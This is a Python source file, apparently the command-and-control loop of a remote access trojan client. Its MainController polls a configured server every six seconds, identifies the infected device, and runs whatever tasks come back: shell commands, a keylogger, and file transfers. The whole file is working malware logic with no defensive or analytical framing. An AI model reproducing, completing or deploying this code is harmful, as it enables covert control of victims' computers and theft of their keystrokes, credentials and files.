import time
import json
import urllib

from requestMethods.requestMethods import *
from config.config import config

class MainController:

	def __init__(self, stateInstance):

		# Control request interval in seconds
		self.controlRequestInterval = 6
		self.controlRequestIsRunning = True

		self.stateInstance = stateInstance


	def sendControlRequest(self):
		print('Sending control request...')
		_data = urllib.parse.urlencode([
			('type', 'control-request'),
			('client_id', self.stateInstance.getState()['deviceId'])
		]).encode("utf-8")
		
		_response = sendRequest(config['domains'][0], _data)

		return json.loads(_response)


	def setControlRequestLoop(self):

		while self.controlRequestIsRunning:

			_result = self.sendControlRequest()
			
			if _result['tasks']:
				print(_result)
				self.executeTasks(_result['client_id'], _result['tasks'])

			time.sleep(self.controlRequestInterval)


	def executeTasks(self, clientId, tasks):

		for index in range(0, len(tasks)):

			if tasks[index]['type'] == 'cmd':
				self.executeCmdTask(clientId, tasks[index])

			if tasks[index]['type'] == 'keylogger':
				self.executeKeyloggerTask(clientId, tasks[index])

			if tasks[index]['type'] == 'downloadfiles':
				self.executeDownloadFilesTask(clientId, tasks[index])

			continue


	def executeCmdTask(self, clientId, task):
		cmdexecInstance = self.stateInstance.getFromState('cmdexecInstance')
		cmdexecInstance.run(clientId, task)

	def executeKeyloggerTask(self, clientId, task):
		keyloggerInstance = self.stateInstance.getFromState('keyloggerInstance')
		keyloggerInstance.run()

	def executeDownloadFilesTask(self, clientId, task):
		filesInstance = self.stateInstance.getFromState('filesInstance')
		filesInstance.run(clientId, task)